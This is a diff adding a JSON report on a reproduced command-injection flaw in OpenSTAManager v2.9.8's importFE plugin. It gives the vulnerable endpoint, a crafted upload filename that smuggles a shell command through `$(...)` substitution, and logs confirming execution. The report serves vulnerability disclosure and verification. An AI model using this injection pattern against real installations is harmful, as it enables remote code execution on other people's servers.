@@ -1,0 +1,34 @@
+{
+  "status": "reproduced",
+  "vulnerability_type": "command_injection_rce",
+  "summary": "The reproduction bundle clones OpenSTAManager `v2.9.8`, restores a seeded vulnerable instance, logs in as a low-privileged `Tecnici` user, uploads a crafted `.p7m`, and confirms that the filename triggers shell execution inside the import plugin.",
+  "reproduction_command": "./reproduction/run.sh",
+  "expected_security_impact": "Running the reproduction should let the low-privileged `evohunt` user upload a `.p7m` file whose name creates `/var/www/html/plugins/importFE/evohunt_rce_marker` through shell command substitution during `openssl smime -verify` execution.",
+  "actual_observed_result": "Running `./reproduction/run.sh` cloned `v2.9.8` at commit `5ff39df9be26ee52f5a1f100754884072bbf82df`, built the container image, restored the seeded database, logged in with `LOGIN_CODE=200`, uploaded the crafted file with `UPLOAD_CODE=200` and response `{\"id\":1}`, and then printed `EVOHUNT_RCE_CONFIRMED marker=/var/www/html/plugins/importFE/evohunt_rce_marker` followed by `REPRODUCTION_SUCCESS`.",
+  "verification_method": "The helper script logs in as the low-privileged user, submits a filename of `$(:>evohunt_rce_marker).p7m` to `/plugins/importFE/actions.php`, and only succeeds if the exact marker file exists under the import plugin working directory. That check distinguishes real shell execution from a generic upload success or parser error.",
+  "verification_passed": true,
+  "evidence_produced_by_run": [
+    "TARGET_REPO_COMMIT=5ff39df9be26ee52f5a1f100754884072bbf82df",
+    "TARGET_REPO_MOUNT_PRESENT=yes",
+    "LOGIN_CODE=200",
+    "UPLOAD_CODE=200",
+    "UPLOAD_RESPONSE={\"id\":1}",
+    "EVOHUNT_RCE_CONFIRMED marker=/var/www/html/plugins/importFE/evohunt_rce_marker",
+    "REPRODUCTION_SUCCESS"
+  ],
+  "limitations_or_blockers": [],
+  "reproduction": {
+    "entrypoint": "./reproduction/run.sh",
+    "reproduction_directory": "reproduction",
+    "dockerfile_path": "reproduction/Dockerfile",
+    "source_acquisition": "run.sh clones the target repository on the host at `v2.9.8`, verifies the pinned commit and vulnerable helper, and mounts that checkout into the container at /target-repo.",
+    "pinned_commit_or_ref": "5ff39df9be26ee52f5a1f100754884072bbf82df",
+    "target_repo_mount_path": "/target-repo",
+    "helper_files": [
+      "reproduction/run_poc.sh",
+      "reproduction/config.inc.php",
+      "reproduction/db_seed.sql.gz",
+      "reproduction/openstamanager-2.9.8.zip"
+    ]
+  }
+}
